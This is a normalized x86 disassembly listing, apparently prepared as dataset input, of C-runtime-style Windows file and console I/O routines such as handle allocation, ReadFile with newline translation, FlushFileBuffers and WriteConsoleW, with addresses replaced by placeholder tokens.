mov eax 0x3
sub_40fb35
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_40faf0
push [ fs : 0x0 ]
mov eax [ rwxdata ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_40fbe5
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_40fc04
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_40fbe5
push ebx
push ecx
mov ebx rwxdata
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_40fc07
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ rwxdata ] 0xfffffffe
jne r-xdata
mov eax [ rwxdata ]
cmp eax 0xffffffff
jne r-xdata
call sub_41481c
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
leave
retn
mov ax [ ebp + 0x8 ]
leave
retn
sub_40fc49
push 0xc
push r--data
call sub_408380
push 0x3
call sub_40ecce
pop ecx
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_40fc07
pop ecx
movzx eax ax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40fc86
mov ax [ ebp - 0x1c ]
call sub_4083c5
retn
sub_40fc8f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_406900
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_40c530
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx ecx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_4078ae
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_40fdc0
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_40fdeb
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
js r-xdata
call sub_4078ae
mov [ eax ] 0x9
call sub_4078c1
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rwxdata ]
jae r-xdata
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
lea edi [ ecx * 4 + rwxdata ]
mov ecx [ edi ]
shl esi 0x6
cmp [ esi + ecx ] 0xffffffff
jne r-xdata
cmp [ rwxdata ] 0x1
push ebx
mov ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ edi ]
mov [ esi + eax ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub eax 0x0
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
push 0xfffffff6
dec eax
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_40fe6c
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
jl r-xdata
call sub_4078ae
mov [ eax ] 0x9
call sub_4078c1
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rwxdata ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
and esi 0x1f
lea edi [ eax * 4 + rwxdata ]
mov eax [ edi ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x1
je r-xdata
cmp [ eax + esi ] 0xffffffff
je r-xdata
cmp [ rwxdata ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_40fef2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_4078c1
and [ eax ] 0x0
call sub_4078ae
mov [ eax ] 0x9
call sub_4078c1
and [ eax ] 0x0
call sub_4078ae
mov [ eax ] 0x9
call sub_407823
jmp r-xdata
cmp eax [ rwxdata ]
jb r-xdata
or eax 0xffffffff
pop ebp
retn
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rwxdata ]
and eax 0x1f
shl eax 0x6
test [ eax + ecx + 0x4 ] 0x1
je r-xdata
mov eax [ eax + ecx ]
pop ebp
retn
sub_40ff5b
push 0xc
push r--data
call sub_408380
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rwxdata ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_40ecce
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_4083c5
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rwxdata ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40fff1
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_40fffa
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rwxdata ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_410021
push 0x18
push r--data
call sub_408380
or [ ebp - 0x1c ] 0xffffffff
xor edi edi
mov [ ebp - 0x24 ] edi
push 0xb
call sub_40ec0c
pop ecx
test eax eax
jne r-xdata
push 0xb
call sub_40ecce
pop ecx
mov [ ebp - 0x4 ] edi
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4101b1
mov eax [ ebp - 0x1c ]
mov esi [ edi * 4 + rwxdata ]
test esi esi
je r-xdata
call sub_4083c5
retn
push 0x40
push 0x20
call sub_40c060
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x20 ] esi
mov eax [ edi * 4 + rwxdata ]
add eax 0x800
cmp esi eax
jae r-xdata
lea ecx [ edi * 4 + rwxdata ]
mov [ ecx ] eax
add [ rwxdata ] 0x20
cmp [ ebp - 0x1c ] 0xffffffff
jne r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
shl edi 0x5
mov [ ebp - 0x1c ] edi
mov eax edi
sar eax 0x5
mov ecx edi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rwxdata ]
mov [ eax + ecx + 0x4 ] 0x1
push edi
call sub_40ff5b
pop ecx
test eax eax
jne r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
add eax 0x40
mov [ ebp - 0x20 ] eax
jmp r-xdata
inc edi
jmp r-xdata
add esi 0x40
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
or [ ebp - 0x1c ] 0xffffffff
mov edx [ ecx ]
add edx 0x800
cmp eax edx
jae r-xdata
mov [ ebp - 0x28 ] edi
cmp edi 0x40
jge r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push 0xa
call sub_40ecce
pop ecx
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
test [ esi + 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_4100f3
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
inc [ esi + 0x8 ]
mov [ ebp - 0x24 ] ebx
jmp r-xdata
mov [ esi + 0x4 ] 0x1
or [ esi ] 0xffffffff
sub esi [ edi * 4 + rwxdata ]
sar esi 0x6
mov eax edi
shl eax 0x5
add esi eax
mov [ ebp - 0x1c ] esi
sub_4101ba
push 0xc
push r--data
call sub_408380
xor edi edi
mov [ ebp - 0x1c ] edi
xor bl bl
test [ ebp + 0xc ] 0x8
je r-xdata
test [ ebp + 0xc ] 0x4000
je r-xdata
add bl 0x20
test [ ebp + 0xc ] 0x80
je r-xdata
or bl 0x80
push [ ebp + 0x8 ]
call [ GetFileType@IAT ]
cmp eax edi
jne r-xdata
or bl 0x10
cmp eax 0x2
jne r-xdata
call [ GetLastError@IAT ]
push eax
call sub_4078d4
pop ecx
cmp eax 0x3
jne r-xdata
or bl 0x40
jmp r-xdata
call sub_410021
mov esi eax
mov [ ebp + 0xc ] esi
cmp esi 0xffffffff
jne r-xdata
or bl 0x8
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
push esi
call sub_40fdeb
pop ecx
pop ecx
or bl 0x1
mov eax esi
sar eax 0x5
lea ecx [ eax * 4 + rwxdata ]
mov eax esi
and eax 0x1f
shl eax 0x6
mov edx [ ecx ]
mov [ edx + eax + 0x4 ] bl
mov edx [ ecx ]
lea edx [ edx + eax + 0x24 ]
and [ edx ] 0x80
mov ecx [ ecx ]
lea eax [ ecx + eax + 0x24 ]
and [ eax ] 0x7f
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4102a8
cmp [ ebp - 0x1c ] edi
je r-xdata
call sub_4078ae
mov [ eax ] 0x18
call sub_4078c1
mov [ eax ] edi
jmp r-xdata
or eax 0xffffffff
mov eax esi
jmp r-xdata
call sub_4083c5
retn
sub_4102a8
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
call sub_40fffa
pop ecx
retn
mov eax esi
sar eax 0x5
mov ecx esi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rwxdata ]
lea eax [ eax + ecx + 0x4 ]
and [ eax ] 0xfe
sub_4102d0
push 0x10
push r--data
call sub_408380
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_4078ae
mov [ eax ] 0x9
call sub_4078ae
mov [ eax ] 0x9
call sub_407823
jmp r-xdata
cmp ebx [ rwxdata ]
jb r-xdata
call sub_4083c5
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rwxdata ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ esi + eax + 0x4 ]
and eax 0x1
je r-xdata
push ebx
call sub_40ff5b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_4078ae
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push ebx
call sub_40fef2
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
and [ ebp - 0x1c ] 0x0
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4103a1
mov eax [ ebp - 0x1c ]
call sub_4078c1
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_4104bc
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push 0xfffffffe
pop eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] edx
cmp esi eax
jne r-xdata
push ebx
xor ebx ebx
cmp esi ebx
jl r-xdata
call sub_4078c1
and [ eax ] 0x0
call sub_4078ae
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_4078c1
mov [ eax ] ebx
call sub_4078ae
mov [ eax ] 0x9
call sub_407823
or eax 0xffffffff
jmp r-xdata
cmp esi [ rwxdata ]
jb r-xdata
pop esi
leave
retn
pop ebx
mov eax esi
sar eax 0x5
push edi
and esi 0x1f
lea edi [ eax * 4 + rwxdata ]
mov eax [ edi ]
shl esi 0x6
mov cl [ eax + esi + 0x4 ]
test cl 0x1
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_4078c1
mov [ eax ] ebx
call sub_4078ae
mov [ eax ] 0x9
jmp r-xdata
call sub_4078c1
mov [ eax ] ebx
call sub_4078ae
mov [ eax ] 0x16
mov [ ebp - 0xc ] ebx
cmp edx ebx
je r-xdata
call sub_407823
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
test cl 0x2
jne r-xdata
pop edi
cmp [ ebp + 0xc ] ebx
je r-xdata
mov al [ eax + esi + 0x24 ]
add al al
sar al 0x1
mov [ ebp - 0x2 ] al
movsx eax al
dec eax
push 0x4
pop ecx
je r-xdata
mov eax edx
not eax
test al 0x1
jne r-xdata
dec eax
jne r-xdata
mov eax edx
shr eax 0x1
mov [ ebp + 0x10 ] ecx
cmp eax ecx
jb r-xdata
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x10 ] ebx
jmp r-xdata
mov eax edx
not eax
test al 0x1
je r-xdata
push [ ebp + 0x10 ]
call sub_40c01b
mov ebx eax
pop ecx
mov [ ebp - 0x10 ] ebx
test ebx ebx
jne r-xdata
mov [ ebp + 0x10 ] eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
mov eax ebx
je r-xdata
and edx 0xfffffffe
mov [ ebp + 0x10 ] edx
push 0x1
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_40b354
mov ecx [ edi ]
mov [ esi + ecx + 0x28 ] eax
add esp 0x10
mov [ esi + ecx + 0x2c ] edx
call sub_4078ae
mov [ eax ] 0xc
call sub_4078c1
mov [ eax ] 0x8
push 0x0
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp + 0x10 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ ecx + 0x5 ]
cmp cl 0xa
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0x18 ]
test ecx ecx
js r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_4078ae
mov [ eax ] 0x9
call sub_4078c1
mov [ eax ] esi
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
ja r-xdata
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x0
mov [ ebx ] cl
mov ecx [ edi ]
lea eax [ ebx + 0x1 ]
mov [ ebp - 0xc ] 0x1
mov [ esi + ecx + 0x5 ] 0xa
je r-xdata
push eax
call sub_4078d4
pop ecx
and [ ebp - 0x14 ] 0x0
jmp r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov eax [ edi ]
add [ ebp - 0xc ] ecx
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x80
je r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x25 ]
cmp cl 0xa
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xfffffffe
jne r-xdata
push eax
call sub_409812
pop ecx
mov eax [ ebp - 0x10 ]
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp - 0x2 ] 0x2
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
je r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0xc ] 0x2
mov [ esi + ecx + 0x25 ] 0xa
jne r-xdata
and [ eax ] 0xfb
cmp [ ebx ] 0xa
jne r-xdata
and [ eax ] 0xfb
cmp [ ebx ] 0xa
jne r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x26 ]
cmp cl 0xa
je r-xdata
sub ebx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ebx
jmp r-xdata
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
cmp ecx 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
mov eax ebx
sub eax [ ebp - 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0xc ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ecx ]
cmp al 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx [ edi ]
lea esi [ esi + ecx + 0x4 ]
test [ esi ] 0x40
jne r-xdata
cmp ecx 0xd
je r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0xc ] eax
cmp ebx eax
jae r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0xc ] eax
cmp ebx eax
jae r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0xc ] 0x3
mov [ esi + ecx + 0x26 ] 0xa
mov ax [ eax ]
mov [ ebx ] ax
add ebx 0x2
or [ esi ] 0x2
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0xfffffffe
cmp eax ecx
jae r-xdata
mov [ ebx ] cx
add ebx 0x2
add eax 0x2
mov [ ebp + 0x10 ] eax
jmp r-xdata
dec ebx
mov cl [ ebx ]
test cl cl
js r-xdata
mov al [ ecx ]
mov [ ebx ] al
inc ebx
or [ eax ] 0x2
jmp r-xdata
mov eax [ ebp - 0xc ]
dec eax
cmp ecx eax
jae r-xdata
mov [ ebx ] al
inc ebx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add [ ebp + 0x10 ] 0x2
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea ecx [ eax + 0x2 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
xor eax eax
inc eax
movzx ecx cl
jmp r-xdata
inc ebx
jmp r-xdata
inc [ ebp + 0x10 ]
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov eax [ ebp - 0xc ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add eax 0x4
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ecx + rwxdata ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
sub ebx [ ebp - 0x10 ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
push ebx
push [ ebp - 0x10 ]
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0xc ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
add ecx 0x2
mov [ ebp + 0x10 ] ecx
jmp r-xdata
push 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
pop eax
mov [ ebx ] ax
cmp eax 0x4
jg r-xdata
mov dl [ ebx ]
movzx ecx dl
movsx ecx [ ecx + rwxdata ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ edi ]
xor ecx ecx
cmp eax ebx
setne cl
add eax eax
mov [ ebp - 0xc ] eax
mov [ esi + edx + 0x30 ] ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebx ] 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
inc ebx
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp ebx [ ebp - 0x10 ]
jb r-xdata
inc ecx
cmp ecx eax
jne r-xdata
call sub_4078ae
mov [ eax ] 0x2a
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_40b354
add esp 0x10
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
push 0xa
jmp r-xdata
push 0xd
pop eax
mov [ ebx ] ax
mov eax [ edi ]
mov cl [ ebp - 0x8 ]
mov [ esi + eax + 0x5 ] cl
mov eax [ edi ]
mov cl [ ebp - 0x7 ]
mov [ esi + eax + 0x25 ] cl
mov eax [ edi ]
mov [ esi + eax + 0x26 ] 0xa
jmp r-xdata
dec ebx
movzx ecx [ ebx ]
inc eax
mov ecx [ edi ]
test [ ecx + esi + 0x4 ] 0x48
je r-xdata
add ebx eax
jmp r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_40b354
add esp 0x10
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
mov cl [ ebp - 0x1 ]
mov [ esi + eax + 0x5 ] cl
jmp r-xdata
add ebx 0x2
neg eax
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_40b354
add esp 0x10
inc ebx
mov [ ecx + esi + 0x5 ] dl
cmp eax 0x2
jl r-xdata
cmp eax 0x3
jne r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x25 ] dl
inc ebx
sub ebx eax
jmp r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x26 ] dl
inc ebx
sub_410a73
push 0x10
push r--data
call sub_408380
mov ebx [ ebp + 0x8 ]
cmp ebx 0xfffffffe
jne r-xdata
test ebx ebx
js r-xdata
call sub_4078c1
and [ eax ] 0x0
call sub_4078ae
mov [ eax ] 0x9
call sub_4078c1
and [ eax ] 0x0
call sub_4078ae
mov [ eax ] 0x9
cmp ebx [ rwxdata ]
jb r-xdata
call sub_4083c5
retn
or eax 0xffffffff
jmp r-xdata
mov eax ebx
sar eax 0x5
lea edi [ eax * 4 + rwxdata ]
mov esi ebx
and esi 0x1f
shl esi 0x6
mov eax [ edi ]
movsx eax [ eax + esi + 0x4 ]
and eax 0x1
je r-xdata
mov eax 0x7fffffff
cmp eax [ ebp + 0x10 ]
sbb eax eax
inc eax
jne r-xdata
push ebx
call sub_40ff5b
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ edi ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_4078c1
and [ eax ] 0x0
call sub_4078ae
mov [ eax ] 0x16
jmp r-xdata
call sub_4078ae
mov [ eax ] 0x9
call sub_4078c1
and [ eax ] 0x0
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
call sub_4104bc
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
call sub_407823
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_410b61
mov eax [ ebp - 0x1c ]
sub_410b69
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
push edi
test edx edx
je r-xdata
call sub_4078ae
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov esi edx
sub esi eax
mov [ edx ] al
jmp r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ edx ] 0x0
call sub_4078ae
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov cl [ eax ]
mov [ esi + eax ] cl
inc eax
test cl cl
je r-xdata
call sub_407823
mov eax esi
jmp r-xdata
sub_410bc8
push 0xc
push r--data
call sub_408380
push 0xe
call sub_40ecce
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_410c2f
call sub_4083c5
retn
mov eax [ rwxdata ]
mov edx rwxdata
push [ esi + 0x4 ]
call sub_409812
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_409812
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_410c38
push 0xc
push r--data
call sub_408380
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp [ edi + 0x4 ] ebx
jne r-xdata
mov eax [ edi + 0x4 ]
push 0x2800
push sub_409812
push sub_409ff1
push ebx
lea eax [ edi + 0x9 ]
push eax
push ebx
call sub_419a2d
add esp 0x18
mov [ ebp - 0x1c ] eax
cmp eax ebx
jne r-xdata
push eax
call sub_40c2b0
pop ecx
mov esi eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp esi ebx
ja r-xdata
call sub_4083c5
retn
dec esi
mov eax [ ebp - 0x1c ]
cmp [ eax + esi ] 0x20
jne r-xdata
dec esi
push 0xe
call sub_40ecce
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ edi + 0x4 ] ebx
jne r-xdata
mov [ eax + esi ] bl
push [ ebp - 0x1c ]
call sub_409812
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_410d21
push 0x8
call sub_409ff1
pop ecx
mov ebx eax
test ebx ebx
